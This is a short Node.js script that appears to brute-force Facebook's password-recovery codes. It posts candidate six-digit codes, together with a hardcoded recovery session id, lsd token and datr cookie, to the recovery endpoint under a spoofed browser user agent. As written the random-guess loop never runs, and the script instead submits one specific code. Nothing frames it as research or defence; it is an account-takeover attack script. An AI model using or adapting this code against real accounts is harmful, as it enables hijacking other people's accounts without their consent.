'use strict';

const log = console.log.bind(console);
const Http2Client = require('./http2-client');
const helpers = require('./helpers');
const child_process = require('node:child_process');
const fs = require('node:fs');

const { rand } = helpers;

const httpClient = new Http2Client(false);

const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';

(async () => {
  const cuid = 'AYhK14oo9cuj1Agr_2Fil2yi1OIMkuGunRn1opjcWhwHLVc1IKFVVNHfrVp6Lhpctozmlm6EyF8nzsJwd35kKWqqPuJsiayujr_seO29-_q6NY6CXnh2m6-T5mCVONsEQW52o6s_mBZt02VuuooikqRlyguJbnh9oKnUupOs28mOww';
  const lsd = 'AVpc27UCGHI';
  const url = 'https://www.facebook.com/recover/code/?cuid='+cuid;
  const headers = {
    'Cookie': 'datr=F_YuaFQVmcfePVvsUJJtDvkK',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT,
    'Sec-Fetch-Site': 'same-origin'
  };
  // const codes = require('./codes');

  // child_process.exec('siren warn');

  const p = [];
  for (let i = 0, code; 0 > i; ++i) {
    code = rand(111111, 999999);
    p.push(new Promise(r => httpClient.post(url, headers, 'lsd='+lsd+'&n='+code).then(res => (log(res.statusCode), r()))));
  }

  Promise.all(p).then(() => {
    log('end');
    httpClient.post(url, headers, 'lsd='+lsd+'&n=402796').then(res => log(res.statusCode));
  });
})();